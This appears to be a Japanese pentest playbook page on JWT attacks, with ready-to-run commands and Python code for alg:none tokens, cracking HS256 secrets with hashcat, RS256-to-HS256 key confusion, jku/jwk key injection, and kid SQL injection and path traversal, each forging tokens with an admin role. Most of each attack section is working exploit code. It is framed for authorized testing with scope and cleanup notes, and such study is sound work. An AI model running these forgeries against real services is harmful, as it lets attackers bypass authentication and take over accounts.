# JWT 操作・署名バイパス攻撃

## 着火条件

- Authorization ヘッダーに `Bearer eyJ...` 形式のトークンが存在する
- Cookie や localStorage に `eyJ` で始まる値がある（Base64 エンコードされた JSON の先頭特徴）
- API レスポンスや JS ファイルに JWT 形式の文字列が露出している
- ログイン後にセッション管理に JWT を使っていることがソース・ヘッダーから確認できる

---

## 環境前提

- 実行環境: テスター端末
- 必要なツール:
  - `jwt_tool`（要インストール: `pip3 install termcolor cprint pycryptodomex requests` + `git clone https://github.com/ticarpi/jwt_tool`、ペネトレ用 Linux ディストリでは標準非搭載）
  - `hashcat`（ペネトレ用 Linux ディストリ標準搭載）
  - `john`（ペネトレ用 Linux ディストリ標準搭載、HMAC-SHA ブルートフォースに使用可）
  - `python3` + `PyJWT`（`pip3 install pyjwt cryptography`、手動操作に使用）
  - Burp Suite（別途インストール要 / Community Edition で十分）
- オフライン代替: `base64 -d` コマンドと `python3` で手動デコード・操作が可能（後述）

---

## 観点・着眼点

**先に確認すること：**

1. トークンが `eyJ` 2 つをピリオドで区切った 3 パーツ構造か確認する（`header.payload.signature`）
2. ヘッダーの `alg` フィールドを確認する → 攻撃パターンの選択に直結
3. `kid`・`jku`・`x5u`・`jwk` フィールドの有無を確認する → 追加攻撃面の有無
4. ペイロードの権限・ロール関連フィールドを確認する（`role`・`admin`・`sub`・`scope` 等）

**シグナル → 次のアクション：**

| ヘッダーの内容 | 試みる攻撃パターン |
|---|---|
| `"alg": "HS256"` のみ | 弱い秘密鍵ブルートフォース（パターン3） |
| `"alg": "RS256"` | RS256→HS256 切り替え（パターン4） / jku 差し替え（パターン5） |
| `"alg": "none"` が受け入れられる | alg:none 攻撃（パターン2） |
| `"kid":` フィールドあり | kid パラメータインジェクション（パターン6） |
| `"jku":` または `"x5u":` フィールドあり | 鍵 URL 差し替え（パターン5） |
| `"jwk":` フィールドを受け付ける実装 | jwk ヘッダーインジェクション（パターン7） |

**攻撃者の思考：** JWT は「サーバー側に状態を持たないセッション」として設計されているため、署名さえ通れば中身を自由に書き換えられる。署名の検証ロジックの実装ミスを突くことが軸になる。

---

## 手順

### パターン1: JWT のデコードと構造確認

**事前準備（必須）：** 対象アプリにログインし、レスポンスまたは Cookie から JWT を取得しておく。

```bash
# [Attacker] Base64 デコードでヘッダー・ペイロードを確認（署名部分は除く）
echo "[JWT_TOKEN]" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo "[JWT_TOKEN]" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

```bash
# [Attacker] jwt_tool で一括確認（構造・クレーム・既知の脆弱性チェック）
python3 jwt_tool.py [JWT_TOKEN]
```

出力の読み方：
```
# ヘッダー例
{"alg": "HS256", "typ": "JWT"}

# ペイロード例
{"sub": "[USER_ID]", "role": "user", "iat": 1700000000, "exp": 1700086400}
```

`role`・`admin`・`isAdmin`・`scope`・`group` 等の権限関連フィールドを書き換えることが最終目標。

---

### パターン2: alg:none 攻撃

**前提：** サーバーが `alg: none`（署名なし）を受け入れる実装ミスがある場合に成立。

```bash
# [Attacker] jwt_tool でペイロードを書き換えつつ alg:none トークンを生成
python3 jwt_tool.py [JWT_TOKEN] -X a
# -X a : alg:none exploit（署名部を空にしてヘッダーを {"alg":"none","typ":"JWT"} に書き換え）
```

python3 で手動生成する場合：

```python
# [Attacker]
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "[USER_ID]", "role": "admin"}).encode())
token   = f"{header}.{payload}."   # 署名部を空にする

print(token)
```

生成したトークンを Authorization ヘッダーまたは Cookie に差し替えてリクエストを送信する。

**成功の確認：** 権限昇格後の機能（管理画面・他ユーザーのデータ等）にアクセスできれば成立。

---

### パターン3: 弱い秘密鍵ブルートフォース（HS256/HS384/HS512）

**前提：** `alg` が HS 系（HMAC）のとき、使用されている秘密鍵が推測可能な場合に成立。

**事前準備（必須）：** JWT をそのままファイルに保存する（改行なし）。

```bash
# [Attacker] JWT をファイルに保存
echo -n "[JWT_TOKEN]" > /tmp/jwt.txt

# hashcat でブルートフォース（mode 16500 = JWT）
# ペネトレ用 Linux ディストリ標準の wordlist を使う場合
hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt

# カスタムワードリストを使う場合
hashcat -a 0 -m 16500 /tmp/jwt.txt [WORDLIST_PATH]
```

```bash
# [Attacker] john でも可
john --wordlist=[WORDLIST_PATH] --format=HMAC-SHA256 /tmp/jwt.txt
```

秘密鍵が判明したら、任意のペイロードで正規署名付きトークンを生成する：

```python
# [Attacker]
import jwt  # pip3 install pyjwt

token = jwt.encode(
    {"sub": "[USER_ID]", "role": "admin"},
    "[CRACKED_SECRET]",
    algorithm="HS256"
)
print(token)
```

---

### パターン4: RS256 → HS256 アルゴリズム切り替え攻撃

**前提：** サーバーが RS256 で署名を発行しており、かつ公開鍵が入手できる場合に成立。
公開鍵を HS256 の秘密鍵として扱うことで、正規署名付きトークンを偽造できる。

**事前準備（必須）：** 対象サーバーの RSA 公開鍵を入手する。

```bash
# [Attacker] よくある公開鍵の入手先
# 1. JWKS エンドポイント（多くの場合 /.well-known/jwks.json または /auth/jwks）
curl -s https://[TARGET_HOST]/.well-known/jwks.json

# 2. TLS 証明書から公開鍵を抽出
openssl s_client -connect [TARGET_HOST]:443 2>/dev/null | openssl x509 -pubkey -noout > /tmp/pubkey.pem
```

```python
# [Attacker] 公開鍵を HS256 の secret として署名
import jwt

with open("/tmp/pubkey.pem", "rb") as f:
    pubkey = f.read()

token = jwt.encode(
    {"sub": "[USER_ID]", "role": "admin"},
    pubkey,
    algorithm="HS256"
)
print(token)
```

```bash
# [Attacker] jwt_tool でも可
python3 jwt_tool.py [JWT_TOKEN] -X k -pk /tmp/pubkey.pem
```

---

### パターン5: jku / x5u URL 差し替え（鍵 URL インジェクション）

**前提：** JWT ヘッダーに `jku`（JWK Set URL）または `x5u`（X.509 証明書 URL）フィールドがあり、
サーバーがその URL から検証用公開鍵を取得する実装の場合に成立。

**事前準備（必須）：** テスター端末から到達可能な外部 URL に攻撃者用 JWKS を公開できること（`python3 -m http.server` 等）。

```bash
# [Attacker] 攻撃者用 RSA 鍵ペアを生成
openssl genrsa -out /tmp/attacker_priv.pem 2048
openssl rsa -in /tmp/attacker_priv.pem -pubout -out /tmp/attacker_pub.pem
```

```bash
# [Attacker] jwt_tool で JWKS を生成し、攻撃者の鍵で署名したトークンを作成
python3 jwt_tool.py [JWT_TOKEN] -X s
# 生成された JWKS ファイルを HTTP サーバーで公開し、jku をそのURLに書き換えたトークンを使用
```

リスナーの起動方法と到達可能 IP の確認は `../../06_Concepts/Reverse_Shell.md`（攻撃側の準備①②）を参照。

---

### パターン6: kid パラメータインジェクション

**前提：** JWT ヘッダーの `kid`（Key ID）フィールドをサーバーが SQL クエリやファイルパスの構築に使っている場合に成立。

#### kid を使った SQLi

```bash
# [Attacker] kid に SQL インジェクションペイロードを埋め込んだトークンを生成
# kid が "SELECT secret FROM keys WHERE id='[KID]'" のようなクエリに使われている場合
python3 jwt_tool.py [JWT_TOKEN] -T
# インタラクティブモードで kid フィールドを以下の値に書き換える:
# ' UNION SELECT '[ATTACKER_CONTROLLED_SECRET]'--
# その後 -S hs256 -p '[ATTACKER_CONTROLLED_SECRET]' で署名
```

#### kid を使ったパストラバーサル

```bash
# [Attacker] kid でファイルシステム上の既知ファイルを鍵として使わせる
# 例: 空のコンテンツを持つファイル（/dev/null）を秘密鍵にさせる
# kid: "../../../../../../dev/null" → 空文字列が秘密鍵になるため、空文字で HS256 署名すれば通る

python3 -c "
import jwt, json
header = {'alg': 'HS256', 'typ': 'JWT', 'kid': '../../../../../../dev/null'}
token = jwt.encode({'sub': '[USER_ID]', 'role': 'admin'}, '', algorithm='HS256', headers=header)
print(token)
"
```

---

### パターン7: jwk ヘッダーインジェクション

**前提：** JWT ヘッダーの `jwk` フィールドに埋め込まれた公開鍵をサーバーがそのまま検証に使う実装の場合に成立。

```bash
# [Attacker] jwt_tool で攻撃者の鍵を jwk に埋め込んだトークンを生成
python3 jwt_tool.py [JWT_TOKEN] -X i
# jwt_tool が自動で鍵ペア生成 → jwk フィールドへ公開鍵埋め込み → 秘密鍵で署名
```

---

## 刺さらなかったとき

- **`alg:none` で 401 が返る** → サーバーが `none` を明示的に拒否している。弱い秘密鍵ブルートフォース（パターン3）に切り替える
- **HS256 秘密鍵のブルートフォースがヒットしない** → ランダム生成された強いキーの可能性大。RS256 系の攻撃（パターン4〜7）に切り替える
- **RS256→HS256 切り替えで 500 / 400 が返る** → 実装が `alg` の一致を厳密にチェックしている。`jku`・`jwk` フィールドの有無を確認してパターン5・7へ
- **kid インジェクションでエラーにならない** → kid の値がログに記録される可能性あり。応答時間の差でブラインド SQLi を試みる
- **全パターンで検証エラーになる** → ライブラリが適切に実装されている可能性が高い。トークンの有効期限（`exp`）・発行者（`iss`）・対象者（`aud`）の検証を個別にテストする

---

## 注意点・落とし穴

- **Base64URL と Base64 の違い** → JWT は Base64URL（`+`→`-`、`/`→`_`、パディング `=` なし）でエンコードされている。`base64 -d` で直接デコードすると失敗することがある。`python3` の `base64.urlsafe_b64decode` を使うか、パディングを補ってから渡す
- **`exp` クレームの書き換え** → 有効期限を延ばす際は UNIX タイムスタンプで指定する（`python3 -c "import time; print(int(time.time()) + 86400)"`）
- **JWKS キャッシュ** → `jku` 差し替え攻撃では、サーバーが JWKS をキャッシュしている場合がある。初回リクエスト時のみ取得する実装では、キャッシュ期間が切れるまで攻撃が通らないことがある
- **HTTPOnly Cookie に入っている JWT** → XSS なしには JS から読めない。ただし Burp Suite / ZAP で傍受・差し替えは可能
- **RS256→HS256 切り替え** → PyJWT v2.x は `algorithm=HS256` に公開鍵を渡すと TypeError を出す。`cryptography` ライブラリの `load_pem_public_key` で読み込み後、`.public_bytes()` で bytes にして渡す

---

## 本番での前提

- **事前合意の要否**: ★★（口頭確認可）— 認証バイパスを伴う場合は事前スコープ確認推奨
- **想定される SIEM/EDR 検知**: WAF ルール（alg:none / 異常なヘッダーフィールドのブロック）/ 認証ログの異常ロール付与アラート
- **業務影響リスク**: なし（読み取り専用の偵察フェーズでは影響なし。認証バイパス成功後の操作内容による）
- **原状回復必須項目**: ✅ 偽造トークンを使って作成・変更したデータがあれば元に戻す
- **取得情報の取扱**: 取得した秘密鍵・クレデンシャルは暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし

---

## 関連技術

- 前：Web 列挙で JWT ベースの認証を確認 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：SSRF でサーバー内部の JWKS エンドポイントを確認 → `./SSRF.md`
- 後：認証バイパス成功後のAPIエンドポイント列挙・権限昇格 → `./IDOR.md` / `./Command_Injection.md`
- 関連：セッション Cookie 窃取（JWT が Cookie に格納されている場合） → `./XSS.md`
- 関連：hashcat 詳細（mode 16500） → `../../05_Tools_Reference/Hashcat.md`
